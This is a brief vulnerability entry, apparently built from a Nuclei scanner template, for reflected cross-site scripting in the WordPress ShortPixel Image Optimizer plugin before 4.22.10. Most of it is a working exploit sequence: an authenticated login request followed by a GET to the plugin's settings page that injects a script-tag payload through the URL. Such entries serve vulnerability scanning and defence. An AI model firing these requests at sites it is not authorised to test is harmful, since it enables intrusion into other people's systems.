# Vulnerability: WordPress ShortPixel Image Optimizer <4.22.10 - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`shortpixel-image-optimizer-xss.yaml`)

## Description
WordPress ShortPixel Image Optimizer 4.22.10 does not escape generated URLs before outputting them back in an attribute, leading to reflected cross-site scripting.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

GET /wp-admin/options-general.php?page=wp-shortpixel-settings&"><script>alert(1)</script> HTTP/1.1
Host: {{Hostname}}
```

